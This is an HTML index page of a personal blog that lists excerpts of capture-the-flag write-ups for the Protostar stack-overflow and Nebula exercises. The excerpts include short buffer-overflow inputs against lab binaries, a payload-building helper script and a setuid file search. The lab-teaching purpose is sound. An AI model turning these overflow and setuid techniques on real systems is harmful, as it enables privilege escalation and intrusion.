@@ -1,0 +1,587 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Aug 28th, 2012 exploits, projects Protostar Stack Exploits (Solutions 6-7) Overview Protostar is a series of exercises from Exploit Exercises. In &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/page/2/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner">
+<div itemscope itemtype="http://schema.org/Blog">
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-28T00:00:00-04:00" data-updated="true" itemprop="datePublished">Aug 28<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/28/protostar-stack2/" itemprop="url">Protostar Stack Exploits (Solutions 6-7)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack 6</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
+
+<h3>Utilities</h3>
+
+<p>We&rsquo;ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
+
+<p><code>~/try-address.sh</code>:</p>
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# Takes an offset and unlimited 4-byte addresses and prints it in little-endian order
+if [[ $# -lt 2 ]]; then
+    echo &quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;
+    exit 1
+fi
+
+perl -e &quot;print 'A'x$1&quot;
+shift
+for addr in $@; do
+    for i in $(seq 8 -2 2); do echo -ne &quot;\x${addr:$i:2}&quot;; done
+done</code></pre>
+</div>
+
+
+
+
+
+		
+		<a href="/blog/2012/08/28/protostar-stack2/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-24T00:00:00-04:00" data-updated="true" itemprop="datePublished">Aug 24<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/24/protostar-stack1/" itemprop="url">Protostar Stack Exploits (Solutions 4-5)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 4</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+
+<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>
+
+<div>
+  <pre><code class='console'>$ gdb ./stack4</code></pre>
+</div>
+
+
+
+
+
+		
+		<a href="/blog/2012/08/24/protostar-stack1/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-18T00:00:00-04:00" data-updated="true" itemprop="datePublished">Aug 18<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/18/protostar-stack0/" itemprop="url">Protostar Stack Exploits (Solutions 0-3)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
+
+<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 0</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
+
+<div>
+  <pre><code class='console'>$ perl -e &quot;print 'a'x65&quot; | ./stack0
+you have changed the 'modified' variable</code></pre>
+</div>
+
+
+<h2>Stack: Level 1</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
+
+<div>
+  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print 'a'x64 . dcba&quot;)
+you have correctly got the variable to the right value</code></pre>
+</div>
+
+
+
+
+
+		
+		<a href="/blog/2012/08/18/protostar-stack0/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-17T00:00:00-04:00" data-updated="true" itemprop="datePublished">Aug 17<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/17/nebula2/" itemprop="url">Nebula Shell Exploits (Solutions 15-19)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 &mdash; I was distracted by some other projects.</p>
+
+<h2>Level 15</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>
+
+<div>
+  <pre><code class='console'>$ strace /home/flag15/flag15 2&gt;&amp;1 | less
+...
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+...</code></pre>
+</div>
+
+
+<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn&rsquo;t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>
+
+
+		
+		<a href="/blog/2012/08/17/nebula2/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-07-12T00:00:00-04:00" data-updated="true" itemprop="datePublished">Jul 12<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/cs/'>cs</a>, <a class='category' href='/blog/categories/knowledge/'>knowledge</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/07/12/scala-and-summer/" itemprop="url">Wrapping Up the Summer</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>It&rsquo;s one of those posts that relates to everyone, but it had been on the edge of my mind recently. This post, titled the &ldquo;<a href="http://tilomitra.com/the-crazy-world-of-code">Crazy World of Code</a>&rdquo;, appeared on Hacker News a few days ago. It references a comment on a different HN article.</p>
+
+
+		
+		<a href="/blog/2012/07/12/scala-and-summer/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-07-08T00:00:00-04:00" data-updated="true" itemprop="datePublished">Jul 8<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/cs/'>cs</a>, <a class='category' href='/blog/categories/knowledge/'>knowledge</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/07/08/systems-prog/" itemprop="url">The Beginning of Systems</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>That went by fast.</p>
+
+<p>Today, I finished both of my introductions to systems programming: the book <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking &ndash; The Art of Exploitation 2e</a> (since June) and the <a href="http://cs61.seas.harvard.edu/wiki/Schedule">lecture slides</a> (since three weeks ago) for the Harvard systems programming course, CS61. I thought I&rsquo;d commemorate.</p>
+
+
+		
+		<a href="/blog/2012/07/08/systems-prog/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-06-28T00:00:00-04:00" data-updated="true" itemprop="datePublished">Jun 28<span>th</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/06/28/nebula1/" itemprop="url">Nebula Shell Exploits (Solutions 10-14)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p>This is the second post for my solutions of <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a></p>
+
+<h2>Level 10</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level10">(full)</a>: Read a token file with the password to the target account. A suid program uses <code>access()</code> to upload a file to a host.</p>
+
+<p>According to <a href="http://linux.die.net/man/2/access">man access()</a>, there&rsquo;s a race condition with this usage of the function:</p>
+
+<div>
+  <pre><code class='console'>man access
+Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
+using open(2) creates a security hole, because the user might exploit the short time interval between
+checking and opening the file to manipulate it. For this reason, the use of this system call should be
+avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
+effective user ID to the real ID and then call open(2).)</code></pre>
+</div>
+
+
+
+
+
+		
+		<a href="/blog/2012/06/28/nebula1/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-06-22T00:00:00-04:00" data-updated="true" itemprop="datePublished">Jun 22<span>nd</span>, 2012</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/06/22/nebula0/" itemprop="url">Nebula Shell Exploits (Solutions 00-09)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1>Overview</h1>
+
+<p>Nebula is a series of &ldquo;capture the flag&rdquo; exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I&rsquo;ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> &mdash; this was a good supplement.</p>
+
+<p>The provided Ubuntu VM has 20 levels (00 &ndash; 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>
+
+<h1>Solutions</h1>
+
+<p>To keep things shorter, a link to the full description is provided with each level. The full description contains relevant source code.</p>
+
+<p>There&rsquo;s no copy paste for Ubuntu Server VMs, but I included the output when it supplemented the solution.</p>
+
+<h2>Level 0</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>
+
+<div>
+  <pre><code class='bash'>$ find / -perm /u+s</code></pre>
+</div>
+
+
+<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>
+
+
+		
+		<a href="/blog/2012/06/22/nebula0/" class="more-link">Read more</a>
+	</div>
+
+</article>
+
+</div>
+<nav id="pagenavi">
+    
+        <a href="/" class="prev">Prev</a>
+    
+    
+    <div class="center"><a href="/blog/archives">Blog Archives</a></div>
+</nav></div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
